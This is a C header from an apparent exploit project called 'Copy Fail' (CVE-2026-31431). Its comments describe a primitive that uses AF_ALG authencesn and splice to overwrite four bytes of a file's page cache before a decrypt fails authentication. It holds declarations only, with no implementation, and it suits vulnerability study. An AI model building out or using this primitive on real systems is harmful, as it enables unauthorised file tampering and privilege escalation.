/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Copy Fail -- CVE-2026-31431
 * Shared AF_ALG/splice page-cache mutation primitive.
 */

#ifndef COPY_FAIL_UTILS_H
#define COPY_FAIL_UTILS_H

#include <sys/types.h>

/* Mutate exactly four bytes of file_fd's page cache at `offset` to
 * `four_bytes`. Drives the AF_ALG authencesn(hmac(sha256),cbc(aes))
 * in-place AEAD-decrypt primitive: the splice'd source page is reused
 * as the (failed) decrypt's destination, so the four bytes have already
 * been overwritten by the time authentication rejects the operation.
 * Returns 0 on success, -1 on error (errno set, perror printed). */
int patch_chunk(int file_fd, off_t offset, const unsigned char four_bytes[4]);

/* Print a diagnostic hint to stderr for a patch_chunk() failure when errno
 * indicates the environment cannot run the primitive: the AF_ALG family is
 * absent (EAFNOSUPPORT) or the authencesn template is unregistered (ENOENT).
 * Prints nothing for other errno values. Pass errno immediately after
 * patch_chunk() returns -1. */
void explain_patch_failure(int err);

#endif /* COPY_FAIL_UTILS_H */
